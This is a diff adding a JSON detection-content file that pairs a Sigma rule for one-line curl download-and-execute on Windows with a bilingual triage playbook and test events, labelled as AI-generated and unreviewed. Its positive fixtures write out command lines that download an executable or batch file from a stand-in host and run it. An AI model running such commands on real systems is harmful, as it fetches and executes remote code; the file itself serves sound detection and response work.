@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
+    "title": "Curl Download And Execute Combination",
+    "level": "high",
+    "status": "test",
+    "author": "Sreeman, Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_cmd_curl_download_exec_combo.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_cmd_curl_download_exec_combo.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105",
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso ejecutó una línea de comandos que llama a curl para descargar un archivo por HTTP(S), lo guarda con -o y encadena otro comando con '&', probablemente para ejecutar lo descargado.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde CommandLine contiene ' -c ' o ' /c ' (por ejemplo cmd.exe /c), 'curl ', 'http', '-o' y '&'. Es el patrón típico de descargar un payload y ejecutarlo en una sola línea.",
+      "why_it_matters": "curl.exe viene incluido en Windows 10 (build 17063 y posteriores), así que un atacante puede usarlo para traer herramientas (T1105, Ingress Tool Transfer) y ejecutarlas mediante binarios legítimos del sistema (T1218), sin instalar nada adicional.",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique la URL, el dominio o IP de destino, la ruta de salida de -o y el comando que sigue a '&'.",
+        "Revise ParentImage y la cadena de procesos: Office, navegadores, wscript, mshta o servicios web como padre de cmd.exe son muy sospechosos.",
+        "Confirme si el archivo descargado existe en el endpoint, obtenga su hash y consúltelo en su plataforma de threat intelligence.",
+        "Busque procesos hijos creados desde la ruta de salida en el mismo host dentro de +/- 15 minutos.",
+        "Revise la telemetría de red y proxy: conexiones al dominio o IP de la URL, tamaño de la respuesta y otros hosts que lo contactaron.",
+        "Valide el usuario que ejecutó el proceso: si es interactivo, de servicio o privilegiado, y si su actividad reciente es coherente.",
+        "Consulte alertas previas del mismo host, usuario y dominio de destino para detectar persistencia o movimiento lateral."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; trate cada alerta como sospechosa hasta verificarla.",
+        "Scripts de instalación o despliegue de TI que descargan un instalador con curl y lo ejecutan en la misma línea.",
+        "Herramientas de desarrolladores o pipelines de CI en estaciones de trabajo que descargan y ejecutan utilidades desde repositorios internos."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del host o del script si la descarga era esperada y si la URL pertenece a un origen aprobado.",
+        "Si es malicioso, aísle el endpoint con su EDR y bloquee el dominio o IP de destino en proxy y firewall.",
+        "Preserve el archivo descargado y su hash para análisis antes de eliminarlo; termine los procesos relacionados.",
+        "Busque el mismo hash, URL o patrón de CommandLine en toda la flota y revise mecanismos de persistencia en el host.",
+        "Restablezca las credenciales del usuario afectado si hubo ejecución confirmada y restaure el equipo desde una imagen limpia si es necesario."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque descargar y ejecutar en una sola línea con curl es una técnica de ataque común y poco frecuente en el uso legítimo."
+    },
+    "en": {
+      "summary": "A process ran a command line that uses curl to download a file over HTTP(S), saves it with -o and chains another command with '&', likely to run the downloaded file.",
+      "what_it_detects": "Windows process creation events where CommandLine contains ' -c ' or ' /c ' (for example cmd.exe /c), 'curl ', 'http', '-o' and '&'. This is the classic one-line download-and-execute pattern.",
+      "why_it_matters": "curl.exe ships with Windows 10 build 17063 and later, so attackers can use it to bring in tools (T1105, Ingress Tool Transfer) and run them through trusted system binaries (T1218) without installing anything.",
+      "triage_steps": [
+        "Read the full CommandLine: note the URL, destination domain or IP, the -o output path and the command after '&'.",
+        "Check ParentImage and the process tree: Office apps, browsers, wscript, mshta or web server processes spawning cmd.exe are highly suspicious.",
+        "Confirm whether the downloaded file exists on the endpoint, collect its hash and look it up in your threat intelligence platform.",
+        "Look for child processes launched from the output path on the same host within +/- 15 minutes.",
+        "Review network and proxy logs: connections to the URL's domain or IP, response size and other hosts contacting it.",
+        "Validate the user: interactive, service or privileged account, and whether recent activity fits their role.",
+        "Check earlier alerts for the same host, user and destination domain for signs of persistence or lateral movement."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; treat each alert as suspicious until verified.",
+        "IT install or deployment scripts that fetch an installer with curl and run it in the same line.",
+        "Developer tools or CI jobs on workstations that download and run utilities from internal repositories."
+      ],
+      "response_steps": [
+        "Confirm with the host or script owner whether the download was expected and the URL is an approved source.",
+        "If malicious, isolate the endpoint through EDR and block the destination domain or IP at proxy and firewall.",
+        "Preserve the downloaded file and hash for analysis before removal; terminate related processes.",
+        "Hunt for the same hash, URL or CommandLine pattern across the fleet and check the host for persistence.",
+        "Reset the user's credentials if execution is confirmed and reimage the host from a clean baseline if needed."
+      ],
+      "severity_rationale": "High fits because a one-line curl download and execute is a common attack technique and rarely seen in legitimate use."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "cmd.exe spawned by Word uses curl to download an executable to Public and runs it with '&'.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "cmd.exe /c curl http://203.0.113.10/update.exe -o C:\\Users\\Public\\update.exe & C:\\Users\\Public\\update.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\Documents\\"
+        }
+      },
+      {
+        "description": "Dash-style -c switch with curl downloading a batch file over HTTPS and executing it.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "cmd -c curl https://files.example.org/s.bat -o %TEMP%\\s.bat & %TEMP%\\s.bat"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Direct curl download of a zip file with no shell /c and no chained command.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "curl.exe -o C:\\Temp\\report.zip https://downloads.example.com/report.zip"
+        }
+      },
+      {
+        "description": "cmd /c curl saving an API response to a file without chaining another command via '&'.",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-03.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\agent\\bin\\Agent.Worker.exe",
+          "CommandLine": "cmd.exe /c curl https://api.example.com/v1/status -o C:\\agent\\_work\\status.json"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
